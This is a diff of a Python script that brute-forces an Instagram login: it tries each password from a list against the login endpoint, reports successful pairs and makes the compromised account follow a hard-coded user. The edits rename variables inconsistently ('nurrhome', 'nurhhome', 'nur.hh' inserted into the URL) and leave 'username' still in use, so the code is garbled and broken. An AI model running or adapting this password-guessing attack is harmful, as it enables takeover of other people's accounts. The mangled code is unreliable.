@@ -17,17 +17,17 @@ else:
 
 
 def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+	r = requests.get('https://www.instagram.com/nur.hh%s/?__a=1' % username) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'username':nurrhome,'id':fUserID}
 
 
-def Login(username,password):
+def Login(nurhhome,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'username':nurrhome, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,22 +67,22 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
+def follow(sess, nurrhome):
+	nurrhome = userExists(nurrhome)
 	if (username == False):
 		return	
 	else:
-		userID = username['id']
+		userID = nurrhome['id']
 		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
-if (username == False):
+nurrhome = str(input('Please enter a username: '))
+nurrhome = userExists(nurrhome)
+if (nurrhome == False):
 	exit()
 else:
-	username = username['username']
+	nurrhome = nurrhome['username']
 
 
 
@@ -91,9 +91,9 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(nurrhome,password)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [nurrhome,password])
 
 		#because i am cool
 		follow(sess,'avr_amit')
